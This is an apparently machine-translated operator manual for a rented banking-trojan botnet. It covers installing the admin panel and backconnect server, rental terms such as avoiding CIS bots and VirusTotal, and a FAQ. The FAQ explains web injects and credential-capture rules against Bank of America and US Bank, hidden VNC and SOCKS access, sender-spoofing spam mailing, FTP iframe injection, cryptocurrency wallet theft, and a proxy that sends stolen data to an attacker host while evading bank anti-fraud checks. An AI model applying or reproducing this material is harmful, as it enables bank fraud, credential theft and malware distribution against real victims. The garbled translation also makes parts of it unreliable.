§ 1. Preparing to install

Before starting the installation, make sure that the configuration of your server, or VDS corresponds to the required load.
Examples of the optimal configuration:
Intel Core i3 3,1 GHz / 4GB RAM / 500GB
Intel Xeon E3-1220V2 3,1 GHz / 8GB RAM / 1TB
Debian 7 Operating System, Debian 6, Debian 5, Fedora 14, Fedora 15, CentOS 5, CentOS 6, Ubuntu 10, SuSe 10.3, FreeBSD 10.1.
For a quick setup, you can use cPanel or Direct Admin to any SSH-client: Putty / Kitty / SecureCRT / Xterm

In addition to the primary server, the usual need VDS platform Windows2008 / 2012 for Backconnect-connection VNC / SOCKS / CMD with bots. Do not forget to turn off the Windows Firewall & UAC
Example 2 Intel Xeon Core / 2GB RAM / 30GB HDD

Before using, you must reconfigure the server to PHP5.
Open the php.ini file which is standard in /etc/php5/cli/php.ini
If the settings are not found, the search command "find / -name" php.ini "-print"
either via WinSCP utility (http://winscp.net)
and change the values ??of the two parameters:

post_max_size = 50M
upload_max_filesize = 1024M

+ Restart Apache command "service httpd restart" or "service apache2 restart"

Then transfer the files in the folder "webadmin" directory of the web server.

In api.php change define the key ( 'API_TOKEN_KEY', 'da39a3ee5e6b4b0d3255bfef95601890afd80709');

For directory webadmin;webadmin/files;webadmin/system;webadmin/system/data;webadmin/files/webinjects;webadmin/public;system/data/TokenSpy; establish chmod 0777

Setting the admin at the address http: // localhost / install /
Of all the parameters, you should pay attention to the "Crypt Key (as a build)", the same key must be in the configuration builder.
Be sure to rename the folder "install" for security purposes, as well as cp.php files (Admin) gate.php and file.php
Create a rule in cron'e to perform regular tasks, it displays cp.php after a successful installation scripts.

Interface admin panel is intuitive, but still go through the main tasks:

1) Registering the Jabber-account to be used as a bot notifications. Fits into the server, login, password, see "Settings (Settings)"
2) It is not recommended to use the "Report Writing in the local path." To export the database to a file, you can use the command mysqldump -u root -p --all-databases> all_dbs.sql
3) If you have kripter who is willing to update your exe, then create an individual user: Users> Add New User> remove all jackdaws except r_svc_crypter_crypt & r_svc_crypter_pay. This user will be able to update your crypt through your limited account. Privilege for adding third-party file he can not be. Also, it is recommended to add a jabber notification kripter on the status of inspections scan4you.net service, it is done on the main page in the settings of the "Configuration exe"
4) Under "Backconnect server" must be filled VNC-Server IP, after saving the files in the directory "webbackconnect" to the root directory htdocs XAMP https://www.apachefriends.org/ru/download.html/Apache more on your VDS. Also, disable the Windows Firewall & UAC.


§ 2. Terms of use

1) The complex is provided on a rental basis. The price does not include the crypt services, injects, hosting downloads. Payments Bitcoin (at the rate of BTC-E) / Perfect Money / Paymer
2) Not boasting complex outside the range of your partner, but perhaps an invitation companions on your recommendation with preliminary agreement on cooperation (see paragraph 10)
3) rent scheme built you next way: you pay a monthly rental period, you are provided with pre-builder on the VPS, in a month you can make unlimited number of builds and configurations at the expiration of the term, you can extend or freeze the service for 30 days, VPS is assigned to you . During the active time of rental, you are provided with all the updates of software that automatically produces an administrator on your VPS. On the desktop, you will always find a fresh set comprising a builder, "webadmin", "webbackconnect". Builder is tied to the VPS, the web part is left for your production server.
4) It is prohibited to sell or lease the product builds the sub-lease. Sharing is possible only with a trusted partner (pre-notifying)
5) When you transfer scripts or database from one server to another, be sure to remove scripts and databases, in order to avoid leakage of the elements of the complex. Do not use free anti-virus scanning services virustotal
6) Do not use Jabber without a PGP / OTR encryption.
7) If necessary, can be free to install and configure your server. You need an SSH / FTP + RDP / VDS access if it is a pure server.
8) The software does not work on the CIS bots and relevant domain zones.
9) Cleaning software once a week or two, extra cleaning for a few hours, on request. Integrated update created as bugfixes and functional improvements, the update is happening every month.
10) Before starting the cooperation, it is possible a small survey on the specifics of your work for the improvement and further builder business proposals, namely: the expected number of installs, the country's main source zaguzok etc

§ 5. F.A.Q

Q: How to Inject web work
A: Web-inject bots allow you to work with a web interface and progruzhat / delete injects groups on specific filters.
This is a quick and practical way, unlike file_webinjects local file. But at the same time you can combine both methods work.
Create a new group "New group" US_Main, the right to "Read / Write", then choose the very US group and add the required amount of injects c option "On" (default is not processed bots, until the campaign has not been created)
Now you need to ask progruzki filters, click "New campaign"
Campaign Name: US_Make
Description Campaign: US 1 Campaign
Web Inject: Select the required Inject
and one or more response filters: List BotID / botnets List / List of countries / download limit
Instant-Inject work with 3 modes:
Dual [Activation mode Web Inject + Local file file_webinjects]
Single [Activation mode Web-inject]
Disabled [Local File Mode file_webinjects]
At any time you can switch from one mode or change inject. You can also create a separate user c permission to create / edit / delete vebinzhektov, this note is only 2 parameters: r_botnet_webinjects_admin & r_botnet_webinjects_coder to create in the "Users" section.

Q: What is necessary API (api.php)
A: With the help of queries to the script, you can create /api.php Backconnect VNC / Socks-connection; Check the status of the robot; Receive Jabber-notification; Show video;
Sample 1: api.php / <token> / video / list botnet = ATM & botId = WIN-ABC123?
Sample 2:? Api.php / <token> / vnc / connect botId = WIN-ABC123 & protocol = VNC
Sample 3:? Api.php / <token> / vnc / connect botId = WIN-ABC123 & protocol = SOCKS
Sample 4: api.php / <token> / jabber / send message = Hello% 20world?!

Where <token> API-code API_TOKEN_KEY registered in the beginning of the script. If there is an appeal to the API directly from the injection produce, it supports auto-substitution macros% BOTID%,% BOTNET%.

Q: How correctly to set filters for Account Parser section "Backconnect server"
A: The filters must be to separate your important links on the total log stream. On Opera / FF / Chrome example, log onto bankofamerica.com and choose a field for entering the login Enter your Online ID, causing right-click an interactive browser menu, choose "Inspect Element": <input type = "text" value = "" class = "search-text-box" id = "id" name = "id"> where name = "id", and is a filter parameter.
Therefore, the rule for the Account-Parser'a will look you next way:
[Rule Name: bankofamerica | URL Mask: https://www.bankofamerica.com/* |: Parameters: id = *]
If there is a need for automatic creation Backconnect SOCKS / VNC / CMD-connection with the appearance of Akka in the logs, then note the protocol type.

Q: How is working Mailer
A: Section allows you to create mass mailings by e-mail standard with PHP.
To correct the configuration, the script [Download Script] need to download and place it on an arbitrary hosts, with which you will be sending in the www-folder, disabling at the same time in the php.ini; magic_quotes_gpc = Off and safe_mode = Off
Then press the [Config] and fill in the parameters [Master E-Mail (for checkup): "name; email" your e-mail to check] and Mailer-script URL: http://www.host.com/mailer.php
You can create a mailing list for the already established list of collected E-mail'ov given Bot'a button "For BotID" or his own name to the new list; email
Supports macros Subject / Body / Attach.
{Name} - Receiver name | {Email} - Receiver E-mail | {Random} - random chars | {Rand0m} - random long number
Recommendation: In order not to fall under one of the spam filters, to create a mailing in the Sender field ( "email" or "name; email") specify the macro name @ {hostname}, in this case, the domain will be used by your host, because when header forgery FROM: a letter is in the Spam folder.

Q: How to work with Hunter File section (File Hunter)
A: Section allows you to work with the bot files, namely to get the list of found files according to the parameters specified in the config entry "FileSearch", follow the update files, run avtoskachivanie for matching conditions and replace the files on the remote host.
Custom download - allows you to download an arbitrary file specified BotID, if you know the exact path, even if it is not specified in the config entry "FileSearch".
Auto download - Automatic downloading of files for a given mask without BotID. Boat performs the task as soon as a corresponding rule and found the file, even if no mask listed in the config entry "FileSearch".
Treat functional File Hunter'a responsibly when changing any data on the remote host. The main function of File Hunter - grabbing * coin-files (multibit.dat / litecoin.dat ...)
Use the right mouse button to bring up the context menu relatively-list file.

Q: A short manual on FTP Iframer
A: Before you start, as in the case with Mailer, download the bulk of ifreymera the link [Download script] and place it on one of the arbitrary hosts, with which you will be sending in the www-folder, disabling while in php.ini ; magic_quotes_gpc = Off and safe_mode = Off
Then create a configuration by selecting [Configuration]
URL iframer script list the link to the script that you have placed.
Mode of action: Just check [check the validity of FTP-accounts found in the logs]
Inject: [ "On" mode]
of Injection Method: Smart / Append / Overwrite [Smart - method allows, if the iframe-code was found and removed, add it again. / Append - iframe-code adds a file to the end before the </ body> </ html>]
bypass Depth: [file search level to ftp-hosting company, take for example the structure of the FTP Connection> public_html (1)> images (2)> gif (3) ....]
Next, we make "Search accounts" and "Running tasks", and then, after some time, you can collect the result statistics. After running, the script will run cron-mode, so be sure to keep the page open.

Q: The main functions and working methods "Neyromodel" (Neuromodel)
A: Neyromodel allows for a comprehensive study of a botnet to create intelligence, selecting the best material for the job, checking quality downloads. You can build a table of studies, including a list of bots and evaluate them on a scale, award points according to the found search criteria.
In each new study can include multiple criteria. For example, you'll need to search the logs and choose: Bank Acc + CC or Bank Acc + ISP E-mail
To get started, create a profile, and then design a problem based on the criteria.

"Find the bots, which came in the last 30 days in http://www.bankofamerica.com id = * with installed McAfee and overcharging X points at the coincidence of the conditions"

Create criteria:
1) {name: BOA LOGIN | Criterion: HTTP POST data | Masks URL: htt *: //www.bankofamerica.com/* | POST data Masks: id = * | Limit days: 30 | Points: 1 | The statistical method, the conditions on the threshold: No <1}
2) {name: AVCheck | By: Installed Software | Masks by name: McAfee * | Limit days: 30 | Points: 1 Conditions on the threshold: No <1}

The statistical method used to summarize the results.
* ** No **: a simple calculation. Each successful execution of test points required will bot. The more reports - the more points.
Example 1 180 :, if found appropriate reports and the number of points = 2, it will be credited with 180 * `2` points
Example 2 :, if the criterion "Login to bankofamerica" ??selected statistics "average per day" "> =" "3", then the points will be awarded only if in the past `Days` days in which the average bot logs into facebook often than three times a day.
More precisely: if in the past number of days `Days` reports that correspond to the criterion of" login in bankofamerica ", on average, above the three - will be credited with` Points` points.
* ** Sum **: the total number of reports.
`Points` points will be awarded if the number of records satisfying the criterion corresponds to the threshold condition.
For example, if there is only `reports_count = 180` appropriate reports and` Points = 2`, with the threshold condition `> = 180`, you will be credited with two points.
* ** Days **: the total number of active days: days, containing the appropriate reports
Points will be awarded if the number of days in which the reports are found suitable, corresponds to the threshold condition.
For example, if there are suitable reports the day before yesterday, yesterday and today, with the threshold condition `> = 3`, the + will be awarded points.
* ** Avg / Day **: Average / Day: the average number of reports per day
Points are awarded if it is the number of reports, the relevant threshold condition on average per day.
For example, if yesterday there are 7 matching records, and today - 2, with the threshold condition '> 4', on average we have `(7 + 2) / 2 = 4.5 'appropriate report daily, because + will be awarded points.
* ** Avg / Week **: Average / Week: the average number of reports per week
Similarly `Avg / Day`, but the number of reports is averaged for the week: it will reduce the effect of the weekend.
* ** Days / Week **: the average number of active days a week.
Points are awarded if an average per week on bot accounts for the number of active days, corresponding to a threshold value.
For example, if a bot comes to facebook strictly three days a week, but even many times, with the threshold condition `> = 3`, he will be credited with points +.

An example of the second problem, the search for inactive accounts:
"Find bots, regardless of the score, which went into your account USBank in the last 21 days no more than 3 times, without criteria and filters"

1) {URL = https://onlinebanking.usbank.com/Auth/Login/Login* | HTTP URL visit | Limit days = 21 | I came no more than 3 times: ie I sign <= 3 times. That is, if found <= 3 reports on this criterion - will credit 1 point. | SUM () <= 3, 1 point}

A full list of the criteria listed below:
The condition on the date / time of the first report prepared by the bot.
The condition on the date / time of the last report produced by the bot.
Conditions at the average online bot per week, in hours.
The condition on the type of the report and its contents
> Presence / absence LUHN10 (SS)
> The presence / absence of the carrier-e-mail (pop3 or web-link)
> Presence / absence of FTP-accounts.
> Search by keyword-am
Condition reports on the type of "Installed Software", allows you to check whether certain software installed.
Condition reports on type "CMD", that contain the specific keyword'y.
Conditions for visiting certain URL'a or more URLs
Conditions for the presence of POST-method variables.


Q: I have not installed the software, or there is a problem with the admin.
A: If you need to debug scripts:

1) Open the file.php :: define ( 'FILEPHP_DEBUG_MODE', 0); and change the value from 0 to 1
2) Open gate.php :: define ( 'GATE_DEBUG_MODE', 0); and change from 0 to 1-3
3) Also, you can make debugging InterGate by analogy with paragraph 1.
Debug logs are created directly in the directory with scripts.

Q: What needs WebProxySrv? How is the work injects?
A: When you work with WebProxySrv (WebMagic) supports the following functions:

** Testing of overall health.
>? Api = system & cmd = test & arg0 = <displayed txt string>
** Activate / deactivate connection backconnect-server protocols on: SOCKS / CMD
>? Api = system & cmd = bc_add & arg0 = socks & arg1 = 233.233.233.212 & arg2 = 5194 & arg3 = connection ok
>? Api = system & cmd = bc_remove & arg0 = socks & arg1 = 233.233.233.212 & arg2 = 5194 & arg3 = connection terminated
** Starting recording
>? Api = system & cmd = video_start & arg0 = videorecordname & arg1 = videostarted
** Activate / deactivate connection Backconnect Hidden VNC
>? Api = system & cmd = hvnc_start & arg0 = 233.233.233.212 & arg1 = 5194 & arg2 = connectionok
>? Api = system & cmd = hvnc_stop & arg0 = connectionterminated
** Creating the registry entries (local storage)
>? Api = registry & cmd = setvalue & arg0 = <arg0here> & arg1 = <arg1here> & arg2 = <arg2here>
arg0: storage type global or local. Local host is bound to, global visibility area is not limited.
     arg1: variable name text string.
     arg2: explanatory variables on the value, a text string.
     arg3: data returned after a call, if you do not uakzano, it returns an empty string.
** Reading registry entries (without the creation of connections to remote browsers)
>? Api = registry & cmd = getvalue & arg0 = <arg0here> & arg1 = <arg1here> & arg2 = <arg2here> & arg3 = <arg3here>
arg0: storage type global or local. Local host is bound to, global visibility area is not limited.
    arg1: variable name text string.
    arg2: Return the type of text or js. If you specify a text, the variable returns kakprostoy text. If you specify js, the variable returns the code "% imya_ukazannoe_v_arg3%" = "% znachenie_peremennoy_value%";
    arg3: variable name issued if the type is specified in js arg2.
Here, you can still use macros% BOTID%,% BOTNET%

Now consider the configuration directly in the config section.
entry "WebMagic"
"WebMagicRemoteProxy" "http://yourh4x0rhost.com/get_valuescript.php"
"WebMagicLocalServer" "% COMMANDSERVER%"
end

The first parameter WebMagicRemoteProxy we ask your domain, where we are forwarding the data to the remote host. For example, if you run a PP and the data for the Gulf taken from the admin area, it is wise before entering into online banking, in order to avoid falling under anti-fraud, to obtain the data from the admin panel and write them into your local web server, namely, in the registry, global repository through setvalue command, it will look you next way:
https://www.usbank.com/WebMagicLocalServer/?api=registry&cmd=setvalue&arg0=3921.84&arg1=GBP&arg2=NAME
This query is injected directly into the HTML-code pages and successfully write data to the registry.
Correspondingly, the query is executed on the same links that handles your AZ inject, but it takes longer on a local web server to write data to the bot registry, without creating any unnecessary dial-up connections, which can detect a bank or an antivirus in case if the domain is asleep.
Note that we refer to / magic_folder / - WebMagicLocalServer that works with Native API Windows and in fact on a remote server that does not exist.
After successful data record would be nice to get them and send to the script (use API.php with JabberController, if you do not have any). To obtain the data, re-turn to the registry with the API-function getvalue
https://www.usbank.com/WebMagicLocalProxy/?api=registry&cmd=getvalue&arg0=3921.84&arg1=GBP&arg2=NAME
Request in response displays a JSON-array, which you can parse as you wish, and send data back to the admin panel or built api.php
Next, there will be a random request
https://www.usbank.com/WebMagicRemoteProxy/?var=JSON_INFO

Despite the fact that the HTML-code will always be present host "www.usbank.com", in this case, the request will go to "WebMagicRemoteProxy" "http://yourhost.com/get_valuescript.php" with the parameters that you specify.

Q: What is difference between debug-version of the release-version?
A: Debug-version is issued in case if there are any problems with the correct operation of the software functionality, in this case, the image file "debug.txt" which is at the root of C: \ (WinXP) or Desktop'e in Vista /7/8.1, this file will provide information about the problem area in the code. The debug-version of all the values ??specified in minutes, as opposed to the release-version.
